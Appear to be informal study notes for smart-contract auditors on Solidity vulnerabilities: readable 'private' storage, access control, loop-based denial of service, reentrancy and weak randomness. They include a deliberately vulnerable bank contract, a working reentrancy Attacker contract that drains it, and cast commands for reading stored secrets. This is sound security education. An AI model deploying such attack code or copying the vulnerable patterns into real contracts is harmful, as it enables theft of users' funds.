A great collection of Common Issues can be fonud in https://github.com/Cyfrin/sc-exploits-minimized. They are amazing!

## 1.PRIVATE IS NOT ACTUALLY PRIVATE!
If you have a Solidity variable that is for instance a passowrd stored as string private s_Privatepassword, it is not actually private.

If we use foundry command ``bash cast storage <contract address> <variable number>`` we get in hex and then we can use ``cast parse-bytes32-string <0xblabla>`` to read it.

## 2. ACCESS CONTROL
Is there a hirearchy in the contract? Can everyone access everything? or should only be certain contracts or owner?


## 3. LOOPS! CAn allow for DoS
In the following example from UpdraftCyfrin course. For every new player, the gas cost willbe higher because you have to loop more times. if the attackar calls the function gasilion times, at the end only gasilioners will be able to enter raffle.

```javascript
function enterRaffle(address[] memory newPlayers) public payable {
    //Audit I: It is not possible to enter yourself multiple times, as the function will revert if there are any duplicates
    //Audit I: No error is being emitted if the entranceFee is not sent
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    //Audit I: This is very gas inefficient
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```
## 4. Reentrancy attacks. specially for functions that send money and LATER update state. Attacker can use this vulnerability via an attack contract with a recieve() function that calls again the sending money function.

```javascript
contract VulnerableBank {
    mapping(address => uint256) public balances;

    // Function to deposit Ether into the bank
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Vulnerable function to withdraw Ether
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // Send Ether to the caller
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        // Update the balance after sending Ether
        balances[msg.sender] -= _amount;
    }

    // Check the contract's balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```
As it can be seen in withdraw the balance is updated after the call function which allows for an attacker with a contracte like the one below to call it several times before balance is set to0.

```javascript
contract Attacker {
    VulnerableBank public vulnerableBank;
    address public owner;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }

    // Function to attack the bank by calling the vulnerable withdraw function
    function attack() public payable {
        require(msg.value >= 1 ether, "Minimum 1 ether required to attack");

        // Deposit some Ether to initiate the exploit
        vulnerableBank.deposit{value: msg.value}();

        // Start the recursive withdrawal
        vulnerableBank.withdraw(msg.value);
    }

    // Fallback function gets triggered when Ether is received
    receive() external payable {
        // Re-enter the vulnerable withdraw function if the balance in the bank is still available
        if (address(vulnerableBank).balance > 0) {
            vulnerableBank.withdraw(msg.value);
        }
    }

    // Allows the attacker to withdraw all stolen funds
    function withdrawFunds() public {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance);
    }
}
```
## 5. WEAK RANDOMNESS

What happens is that tis next way of getting random number is very exploitable:
``` javascript
     */
    function getRandomNumber() external view returns (uint256) {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao, block.timestamp)));
        return randomNumber;
    }
```
(this next pieace of info is taken directly from updraftcyfrin.io course:
### block.timestamp

Relying on block.timestamp is risky for a few reasons as node validators/miners have privileges that may give them unfair advantages.

The validator selected for a transaction has the power to:

* Hold or delay the transaction until a more favorable time
* Reject the transaction because the timestamp isn't favorable

Timestamp manipulation has become less of an issue on Ethereum, since the merge, but it isn't perfect. Other chains, such as Arbitrum can be vulnerable to several seconds of slippage putting randomness based on `block.timestamp` at risk.

### block.prevrandao

`block.prevrandao` was introduced to replace `block.difficulty` when the merge happened. This is a system to choose random validators.

The security issues using this value for randomness are well enough known that many of them are outlined in the **[EIP-4399](https://eips.ethereum.org/EIPS/eip-4399)** documentation already.

The security considerations outlined here include:

**Biasability:** The beacon chain RANDAO implementation gives every block proposer 1 bit of influence power per slot. Proposer may deliberately refuse to propose a block on the opportunity cost of proposer and transaction fees to prevent beacon chain randomness (a RANDAO mix) from being updated in a particular slot.

**Predictability:** Obviously, historical randomness provided by any decentralized oracle is 100% predictable. On the contrary, the randomness that is revealed in the future is predictable up to a limited extent.

### msg.sender

Any field controlled by a caller can be manipulated. If randomness is generated from this field, it gives the caller control over the outcome.

By using msg.sender we allow the caller the ability to mine for addresses until a favorable one is found, breaking the randomness of the system.
